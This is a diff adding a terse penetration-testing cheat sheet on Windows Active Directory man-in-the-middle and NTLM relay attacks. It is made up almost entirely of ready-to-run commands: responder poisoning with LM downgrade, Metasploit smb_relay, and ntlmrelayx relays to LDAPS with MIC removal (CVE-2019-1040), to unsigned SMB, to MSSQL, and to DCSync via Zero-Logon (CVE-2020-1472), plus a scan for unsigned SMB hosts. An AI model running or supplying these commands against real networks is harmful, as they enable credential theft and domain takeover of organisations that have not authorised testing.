@@ -1,0 +1,42 @@
+### Mitm
+
+
+Listen
+	🔥 responder -I eth0 (use --lm to force lm downgrade)
+    	smbclient.py
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	
+NTLM Relay
+
+relay on itself (#windows200 / windows server2008) - MS08-068
+		use exploit/windows/smb/smb_relay 
+
+SMB -> LDAP(S)
+	NetNTLMv1 / remove mic
+	NetNTLMv2 /	 remove mic (CVE-2019-1040)
+	relay to LDAP
+		ntlmrelayx.py -t ldaps://<dc> --remove-mic --add-computer <computer_name> <computer_password> --delegate-access -smb2support
+
+SMB unsigned
+	Find SMB not signed (default on non DC)
+		nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK
+		use exploit/windows/smb/smb_relay
+		cme smb $hosts --gen-relay-list relay.txt
+	ntlmrelayx.py  -wh <attacker_ip> -t smb://<target> -l /tmp -6 -debug
+	🔥ntlmrelayx.py  -tf targets.txt  -smb2support -socks (-6)
+
+HTTP
+	sccm ntlm relay attack
+	http ADCS web
+
+MSSQL
+	relay to mssql
+		ntlmrelayx.py -t mssql://<ip> -smb2support –socks
+
+SMB -> Netlogon - Zero-Logon (safe method) - CVE-2020-1472
+		coerce come from dc01, relay to dc02
+		ntlmrelayx.py -t dcsync://<dc_02_ip> -smb2support -auth-smb <user>:<password>
+
+
